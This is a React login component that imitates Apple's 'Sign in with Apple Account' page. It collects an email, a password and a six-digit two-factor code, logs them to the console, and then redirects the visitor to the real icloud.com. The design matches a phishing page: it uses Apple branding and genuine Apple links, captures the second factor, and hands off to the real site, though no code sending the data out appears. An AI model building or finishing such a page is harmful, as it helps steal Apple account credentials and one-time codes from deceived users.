import AppleLoginIcon from "../assets/apple.svg";
import React, { useState, useRef } from "react";
import { BsArrowRightCircle } from "react-icons/bs";
import ProgressCircle from "./ProgressCircle";
import LoadingCircle from "../assets/loading.svg";

const LoginForm = () => {
  const [isDropdown, setIsDropdown] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState(Array(6).fill(""));

  const otpRefs = useRef(
    Array(6)
      .fill()
      .map(() => React.createRef())
  );

  const handleDropdown = () => setIsDropdown(!isDropdown);
  const handleLogin = () => {
    setIsVerifying(true);
    console.log("Logging in with:", { email, password });
  };

  const handleEmailChange = (e) => setEmail(e.target.value);
  const handlePasswordChange = (e) => setPassword(e.target.value);

  const handleOtpChange = (index, value) => {
    const lastChar = value.slice(-1);
    setOtp((prev) => {
      const copy = [...prev];
      copy[index] = lastChar;
      return copy;
    });

    if (otp.every((d) => d !== "")) {
      handleVerifyCode(otp);
    }

    if (value.length === 1 && index < otp.length - 1) {
      otpRefs.current[index + 1]?.focus();
    } else if (value.length === 0 && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleVerifyCode = (otp) => {
    const otpCode = otp.join("");
    console.log("Verifying OTP:", otpCode);
    window.location.href = "https://icloud.com";
  };

  return (
    <div className="login-form flex flex-col items-center justify-center w-[20rem] sm:w-[30rem] p-10 bg-white text-black rounded-2xl shadow-2xl border border-gray-200">
      <img
        src={AppleLoginIcon}
        alt="Apple login icon"
        className="w-32 sm:w-40"
      />

      {!isVerifying ? (
        <div className="w-full">
          <h2 className="heading text-lg sm:text-2xl font-semibold tracking-tight mt-4">
            Sign in with Apple Account
          </h2>

          {/* Email input */}
          <div
            className={`flex w-full border mt-4 sm:mt-8 bg-gray-50 ${
              !isDropdown ? "rounded-xl" : "rounded-t-xl"
            }`}
          >
            <input
              type="text"
              placeholder="Email or Phone number"
              className="p-3 pl-4 w-full text-sm outline-none bg-transparent"
              value={email}
              onChange={handleEmailChange}
            />
            <button className="mr-4" onClick={handleDropdown}>
              {!isDropdown && (
                <BsArrowRightCircle
                  size={window.innerWidth < 640 ? 20 : 25}
                  color="#000"
                />
              )}
            </button>
          </div>

          {/* Password input */}
          {isDropdown && (
            <div className="flex w-full border bg-gray-50 rounded-b-xl mt-[1px]">
              <input
                type="password"
                placeholder="Password"
                className="p-3 pl-4 w-full text-sm outline-none bg-transparent"
                value={password}
                onChange={handlePasswordChange}
              />
              {!isLoading ? (
                <button className="mr-4" onClick={handleLogin}>
                  <BsArrowRightCircle
                    size={window.innerWidth < 640 ? 20 : 25}
                    color="#000"
                  />
                </button>
              ) : (
                <img
                  src={LoadingCircle}
                  alt="loading"
                  className="animate-spin w-8 mr-2"
                />
              )}
            </div>
          )}

          {/* Options */}
          <div className="mt-8 sm:mt-10">
            <input type="checkbox" id="keepmesignedin" />
            <label htmlFor="keepmesignedin" className="text-sm ml-2">
              Keep me signed in
            </label>
          </div>

          <div className="flex flex-col mt-8 sm:mt-10 text-xs text-blue-600 gap-2">
            <a href="https://iforgot.apple.com/password/verify/appleid">
              Forgot password?
            </a>
            <a href="https://www.icloud.com/system/icloud.com/2512Hotfix21/en-us/">
              Create Apple Account
            </a>
          </div>
        </div>
      ) : (
        <div className="w-full mt-8">
          <h1 className="text-lg font-medium">Two-Factor Authentication</h1>
          <div className="gap-1 flex items-center justify-center mt-4 font-bold text-lg">
            {otp.map((digit, index) => (
              <input
                key={index}
                type="text"
                className={`w-9 p-1 rounded-lg bg-gray-100 border text-center outline-none ${
                  digit ? "border-green-500" : "border-gray-300"
                }`}
                value={digit}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                ref={(ref) => (otpRefs.current[index] = ref)}
              />
            ))}
          </div>
          <h2 className="text-sm mt-8">
            Enter the verification code sent to your Apple devices.
          </h2>
          <div className="flex flex-col text-xs mt-4 text-blue-600">
            <button>Resend code to devices</button>
            <button className="tracking-wide mt-1">
              Can't get to your devices
            </button>
          </div>
          <hr className="mt-4 w-full border-gray-200" />
          <p className="text-xs mt-4 tracking-wide text-gray-600">
            If you can't enter a code because you've lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
          </p>
        </div>
      )}
    </div>
  );
};

export default LoginForm;
